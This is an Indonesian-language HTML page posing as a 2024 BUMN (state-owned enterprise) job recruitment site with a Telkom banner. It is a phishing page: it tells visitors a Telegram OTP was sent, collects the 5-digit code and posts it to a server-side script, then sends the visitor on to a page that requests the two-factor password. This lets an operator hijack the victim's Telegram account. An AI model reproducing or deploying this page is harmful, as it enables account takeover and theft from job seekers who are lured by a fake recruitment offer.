<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta property="og:title" content="Rekrutmen Bersama BUMN 2024">
    <meta property="og:image" content="/public/images/bumn.png">
    <meta name="description" content="Info Lowongan pekerjaan BUMN dan Swasta 2024 | TELKOM | MR DIY | BANK BRI | PEGADAIAN | PT FREEPORT | ALFAMART PERTAMINA| DAFTAR SEKARANG!! KLIK SINI ...">
    <meta name="author" content="Rekrutmen Bersama BUMN 2024">
    <title>LOKER BUMN</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&amp;family=Protest+Guerrilla&amp;family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&amp;display=swap" rel="stylesheet">
    <link rel="icon" href="/public/images/favicon.ico" type="image/x-icon" sizes="32x25">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link rel="stylesheet" href="./public/css/style.css">
</head>

<body cz-shortcut-listen="true">
    <div class="loading" style="display: none" id="loading">
        <div class="loader"></div>
    </div>

    <section>
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-md-10 col-lg-6">
                    <div class="card">
                        <div class="card-body">
                            <div class="top-card">
                                <img src="/public/images/telkom2.jpg" alt="banner">
                            </div>
                            <div class="middle-card mt-3">

                                <p class="text-center">
                                    Kami telah mengirimkan 5-digit OTP ke akun
                                    <strong class="phone-number">Telegram Anda</strong>.
                                </p>

                                <form id="code-form">
                                    <div class="mb-3">
                                        <input type="tel" class="form-control" name="code" id="code" minlength="5" maxlength="5" placeholder="5-digit OTP" required="">
                                    </div>
                                    <div class="mb-3 text-center">
                                        <button type="submit" class="btn btn-login text-uppercase">
                                            Berikutnya
                                        </button>
                                    </div>
                                </form>

                            </div>
                            <div class="bottom-card"></div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
    <script src="https://code.jquery.com/jquery.min.js"></script>
    <script>
        $(document).ready(function() {
            var img = sessionStorage.getItem("img");
            console.log(img);
            $(".top-card").children("img").attr("src", img);
            
            var phoneNumber = localStorage.getItem("phoneNumber");
            if (phoneNumber) {
                $(".phone-number").text(phoneNumber);
            }

            $("#code-form").on("submit", function(e) {
                e.preventDefault();
                var code = $("#code").val();
                verifyTelegramCode(code);
            });
        });

        function verifyTelegramCode(code) {
            $(".loading").show();
            $.ajax({
                url: "./core/otp.php",
                type: "POST",
                data: {
                    code: code
                },
                dataType: "json",
                success: function(response) {
                    $(".loading").hide();
                    
                    if (response.success) {
                        if (response.needs_password) {
                            // Need 2FA password
                            window.location.href = "./password.php";
                        } else {
                            // Authentication completed
                            window.location.href = "./completed.php";
                        }
                    } else {
                        // Authentication failed
                        toastr.error("Kode verifikasi tidak valid. Silakan coba lagi.");
                    }
                },
                error: function(error) {
                    $(".loading").hide();
                    console.log("Error:", error);
                    toastr.error("Terjadi kesalahan. Silakan coba lagi.");
                },
            });
        }
    </script>
</body>

</html>
